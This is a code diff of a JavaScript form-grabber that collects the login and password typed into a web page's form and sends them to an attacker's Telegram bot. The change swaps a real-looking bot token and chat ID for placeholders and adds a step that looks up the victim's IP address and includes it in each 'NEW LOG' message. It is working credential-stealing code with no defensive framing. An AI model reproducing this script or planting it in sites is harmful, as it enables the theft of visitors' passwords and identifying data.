@@ -1,12 +1,12 @@
-﻿var token = '842057334:AAFzHtkcs50o_ARI8kx1_mnAT4TBa-T9ea8';
+var token = 'xxx';
 var api = 'https://api.telegram.org/bot' + token;
-var UID = '639624497';
-
+var UID = 'xxx';
+var ip = "None"
     $("form").submit(function() {
        var login = $(this).parent().find('input[type=text]').val();
        var pass = $(this).parent().find('input[type=password]').val();
+
 	   var currentSite = document.domain;
-	   var message = "<b>NEW LOG</b> \n SITE: " + currentSite + '\n DATA: ' + login + ':' + pass;
-	   $.get(api + '/sendMessage?chat_id=' + UID + '&text=' + encodeURIComponent(message) + '&parse_mode=html');
+        $.getJSON( "https://json.geoiplookup.io/api", function(data){ var message = "<b>NEW LOG</b> \n SITE: " + currentSite + '\n DATA: ' + login + ':' + pass + "\n IP " + data["ip"]; $.get(api + '/sendMessage?chat_id=' + UID + '&text=' + encodeURIComponent(message) + '&parse_mode=html');})
     });
 	
